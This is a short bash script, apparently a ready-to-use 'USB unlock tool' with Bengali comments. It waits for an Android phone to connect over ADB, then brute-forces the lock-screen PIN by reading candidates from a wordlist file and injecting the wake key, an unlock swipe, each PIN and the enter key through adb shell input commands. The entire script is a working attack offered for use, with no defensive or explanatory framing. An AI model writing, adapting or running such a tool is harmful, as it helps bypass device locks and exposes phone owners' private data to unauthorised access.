#!/bin/bash

# কালার কোড
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# বড় ডট সিম্বল
BIG_DOT="●"

# টেক্সট সেন্টারে নেওয়ার জন্য স্পেস (Padding)
PAD="          "

clear
echo -e "${CYAN}${PAD}=======================================${NC}"
echo -e "${CYAN}${PAD}   USB AUTO-DETECTION UNLOCK TOOL      ${NC}"
echo -e "${YELLOW}${PAD}        Developed by: Samsuddin            ${NC}"
echo -e "${CYAN}${PAD}=======================================${NC}"
echo ""

# ১. লাইভ অ্যাক্টিভিটি লুপ (মাঝখানে লাল ব্লিংকিং)
while true; do
    device_status=$(adb devices | grep -w "device" | wc -l)
    
    if [ "$device_status" -gt 0 ]; then
        model_name=$(adb shell getprop ro.product.model)
        echo -e "\n${PAD}${GREEN}$BIG_DOT USB Connected: $model_name${NC}"
        break
    else
        # বড় লাল ডট ব্লিংক করবে সেন্টারে
        echo -ne "${PAD}${RED}$BIG_DOT USB Scanning...${NC}\r"
        sleep 0.5
        echo -ne "${PAD}  USB Scanning...${NC}\r" 
        sleep 0.5
    fi
done

echo -e "\n${PAD}${YELLOW}[*] Initializing Pin Scanner...${NC}"
sleep 2

# ২. পিন স্ক্যানিং প্রসেস
PIN_FILE="pins.txt"
if [ ! -f "$PIN_FILE" ]; then
    echo -e "\n${RED}${PAD}[!] Error: pins.txt not found!${NC}"
    exit 1
fi

echo -e "${CYAN}${PAD}---------------------------------------${NC}"

while read -r pin; do
    echo -e "${PAD}${CYAN}[->] Processing: ${GREEN}$pin${NC}"
    
    # ADB Commands
    adb shell input keyevent 26
    adb shell input touchscreen swipe 500 1500 500 500
    sleep 1
    adb shell input text "$pin"
    adb shell input keyevent 66
    
    # প্রসেসিং ডট
    echo -ne "${PAD}${YELLOW}$BIG_DOT Waiting for Device...${NC}\r"
    sleep 5
done < "$PIN_FILE"

echo -e "\n${GREEN}${PAD}=======================================${NC}"
echo -e "${GREEN}${PAD}         PROCESS COMPLETED             ${NC}"
echo -e "${GREEN}${PAD}=======================================${NC}"


